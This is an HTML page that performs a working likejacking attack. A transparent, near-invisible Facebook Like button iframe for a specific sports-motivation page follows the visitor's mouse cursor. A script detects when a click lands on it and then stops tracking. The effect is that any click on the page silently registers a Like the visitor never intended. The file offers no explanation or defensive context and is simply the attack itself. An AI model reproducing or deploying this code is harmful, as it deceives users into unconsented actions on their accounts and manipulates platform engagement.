<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <title>link</title>
    <script src="https://ajax.googleapis.com/ajax/libs/jquery/1.12.4/jquery.min.js"></script>
    <script type="text/javascript">
    var interval = 0;

    function updateActiveElement() {
        if ($(document.activeElement).attr('id') == "fb-iframe") {
            clearInterval(interval);
            bodyClicked = true;
        }
    }

    $(function() {
        interval = setInterval("updateActiveElement();", 50);
    });
    </script>
</head>

<body>
    <div style="overflow: hidden; width: 10px; height: 12px; position: absolute; filter:alpha(opacity=0); -moz-opacity:0.0; -khtml-opacity: 0.0; opacity: 0.0;" id="iframe-wrapper">
        <iframe src="https://www.facebook.com/plugins/like.php?href=https://www.facebook.com/motyvacijasportuilt/&send=false&layout=button_count&width=450&show_faces=false&action=like&colorscheme=light&font&height=21&confirm=false" scrolling="no" frameborder="0" style="border:none;overflow:hidden;width:450px;height:21px;" allowTransparency="false"></iframe>
    </div>
    <script type="text/javascript">
    var bodyClicked = false;
    var iframeWrapper = document.getElementById('iframe-wrapper');
    var standardBody = (document.compatMode == "CSS1Compat") ? document.documentElement : document.body;

    function mouseFollower(e) {
        // for internet explorer
        if (window.event) {
            iframeWrapper.style.top = (window.event.y - 5) + standardBody.scrollTop + 'px';
            iframeWrapper.style.left = (window.event.x - 5) + standardBody.scrollLeft + 'px';
        } else {
            iframeWrapper.style.top = (e.pageY - 5) + 'px';
            iframeWrapper.style.left = (e.pageX - 5) + 'px';
        }
    }

    document.onmousemove = function(e) {
        if (bodyClicked == false) {
            mouseFollower(e);
        }
    }
    </script>
</body>

</html>
